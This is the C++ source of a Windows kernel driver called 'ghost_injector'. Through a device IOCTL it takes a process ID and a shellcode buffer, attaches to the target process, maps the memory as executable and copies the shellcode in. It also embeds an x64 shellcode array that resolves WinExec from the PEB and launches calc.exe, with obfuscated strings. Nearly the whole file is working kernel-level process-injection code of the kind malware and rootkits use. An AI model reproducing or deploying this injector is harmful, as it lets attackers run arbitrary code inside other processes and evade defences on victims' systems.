#include <ntifs.h>
static UNICODE_STRING device_name = RTL_CONSTANT_STRING(L"\\Device\\ghost_injector");
static UNICODE_STRING symbolic_link = RTL_CONSTANT_STRING(L"\\DosDevices\\ghost_injector");
namespace common {
	inline bool status(NTSTATUS status) { return NT_SUCCESS(status); }

	inline PVOID api(UNICODE_STRING api_func) { return MmGetSystemRoutineAddress(&api_func); }


}
typedef NTKERNELAPI PVOID PsGetProcessSectionBaseAddress(__in PEPROCESS Process);

PsGetProcessSectionBaseAddress* pGetProcessSectionBaseAddress;

typedef struct ret_buffer {
	PVOID VA;
}ret_buffer, * pret_buffer;
unsigned char shellcode[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";
static UNICODE_STRING PsGetProcessBaseAddressApi = RTL_CONSTANT_STRING(L"PsGetProcessSectionBaseAddress");
#define KGHOST_INJECTOR CTL_CODE(FILE_DEVICE_UNKNOWN,0x601,METHOD_NEITHER,FILE_READ_DATA | FILE_WRITE_DATA)

typedef struct kghost_mem {

	ULONG pid;
	char* shellcode;
	SIZE_T shellcode_size;
}kghost_mem,*pkghost_mem;
static auto kghost_alloc(ULONG pid,char *tshellcode,SIZE_T shellcode_size) -> PVOID {
	auto status = STATUS_SUCCESS;
	PEPROCESS e_process=NULL;
	auto mdl = PMDL(nullptr);
	KAPC_STATE kapc_state;
	PVOID address = NULL;
	PVOID base_address=NULL;
	PVOID user_address = NULL;
	SIZE_T shc_size = shellcode_size + 1;
	status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(pid), &e_process);
	if (!NT_SUCCESS(status)) {
		DbgPrint("invalid process id failed to get PEPROCESS : %X", status);
		goto done;
	}
	KeStackAttachProcess(e_process, &kapc_state);
	ZwAllocateVirtualMemory(ZwCurrentProcess(), &base_address, 0, &shc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	mdl = IoAllocateMdl(reinterpret_cast<PVOID>(base_address), shellcode_size, FALSE, FALSE, NULL);
	MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
	if (mdl != NULL) {
		address = MmGetSystemAddressForMdlSafe(mdl, HighPagePriority);
		if (address != NULL) {
			DbgPrint("destination => %p\r\n", address);


		}
		else {
			DbgPrint("failed to get destination\r\n");
			status = -1;
			goto done;
		}
		user_address = MmMapLockedPagesSpecifyCache(mdl, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
		DbgPrint("userdestination => %p\r\n", user_address);

		MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE);
		RtlCopyMemory(user_address, tshellcode, shellcode_size);
		MmUnmapLockedPages(address, mdl);
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		KeUnstackDetachProcess(&kapc_state);

	done:
		return user_address;
	}
}
static auto major_control_function(PDEVICE_OBJECT DeviceObject, PIRP Irp) -> NTSTATUS {
	UNREFERENCED_PARAMETER(DeviceObject);
	auto result = STATUS_SUCCESS;
	auto IoStackLocation = PIO_STACK_LOCATION(nullptr);
	auto xghost_mem = pkghost_mem(nullptr);
	
	struct ret_buffer ret_buff;
	PVOID user_address = NULL;
	IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	if (IoStackLocation->Parameters.DeviceIoControl.InputBufferLength < sizeof(kghost_mem)) {
		result = STATUS_BUFFER_TOO_SMALL;
		DbgPrint("invalid  data : %X\r\n", result);
		goto done;
	}

	xghost_mem = reinterpret_cast<pkghost_mem>(IoStackLocation->Parameters.DeviceIoControl.Type3InputBuffer);
	if (xghost_mem == NULL)
	{
		goto done;
	}
	if (IoStackLocation->Parameters.DeviceIoControl.IoControlCode == KGHOST_INJECTOR) {
		DbgPrint("pid => %d\r\n", xghost_mem->pid);
		DbgPrint("shellcode size => %p", xghost_mem->shellcode_size);
		user_address=kghost_alloc(xghost_mem->pid, xghost_mem->shellcode, xghost_mem->shellcode_size);
		DbgPrint("user_address=>%p\r\n", user_address);
		ret_buff.VA = user_address;
		RtlCopyMemory((PCHAR)Irp->UserBuffer, &ret_buff, sizeof(ret_buffer));
		
	}
	
		
	done:
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return result;

}
static auto default_major_function(PDEVICE_OBJECT DeviceObject, PIRP Irp) -> NTSTATUS {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_NOT_SUPPORTED;
}
static auto unload(PDRIVER_OBJECT DriverObject)->void {
	IoDeleteSymbolicLink(&symbolic_link);
	IoDeleteDevice(DriverObject->DeviceObject);
}
extern "C" auto DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) -> NTSTATUS {
	UNREFERENCED_PARAMETER(RegistryPath);
	static auto result = STATUS_SUCCESS;
	static auto device_object = PDEVICE_OBJECT(nullptr);
	DbgBreakPoint();
	pGetProcessSectionBaseAddress = (PsGetProcessSectionBaseAddress*)common::api(PsGetProcessBaseAddressApi);
	DriverObject->DriverUnload = unload;
	for (auto i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
		DriverObject->MajorFunction[i] = default_major_function;
	}
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = major_control_function;
	result = IoCreateDevice(DriverObject,NULL,&device_name,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&device_object);
	if (!NT_SUCCESS(result)) {
		DbgPrint("failed to create device : %X\n", result);
		goto done;
	}
	result = IoCreateSymbolicLink(&symbolic_link, &device_name);
	if (!NT_SUCCESS(result)) {
		DbgPrint("failed to create symbolic link :%X\n", result);
		IoDeleteDevice(device_object);

	}

done:
	return result;

	/*PsGetProcessSectionBaseAddress* p_get_process_section_base_address = (PsGetProcessSectionBaseAddress*)MmGetSystemRoutineAddress(&zw_api_2);
	PEPROCESS pe;
	PsLookupProcessByProcessId((HANDLE)2624, &pe);
	PVOID pv = NULL;
	PVOID p = p_get_process_section_base_address(pe);
	PVOID user_destination = NULL;
	PVOID destination = NULL;
	KAPC_STATE apc_state;
	KeStackAttachProcess(pe, &apc_state);
	SIZE_T pv_size = 4096;
	 ZwAllocateVirtualMemory(ZwCurrentProcess(), &pv, 0, &pv_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	 DbgPrint("got virtual address => %p\r\n", pv);
	PMDL mdl = IoAllocateMdl(pv, 4096, FALSE, FALSE, NULL);
	MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
	if (mdl != NULL) {
		destination = MmGetSystemAddressForMdlSafe(mdl, HighPagePriority);
		if (destination != NULL) {
			DbgPrint("destination => %p\r\n", destination);


		}
		else {
			DbgPrint("failed to get destination\r\n");
		}
		user_destination = MmMapLockedPagesSpecifyCache(mdl, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
		DbgPrint("userdestination => %p\r\n", user_destination);

		MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE);
		RtlCopyMemory(user_destination, shellcode, sizeof(shellcode));
		MmUnmapLockedPages(destination, mdl);
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		KeUnstackDetachProcess(&apc_state);

	}*/
	return STATUS_SUCCESS;
}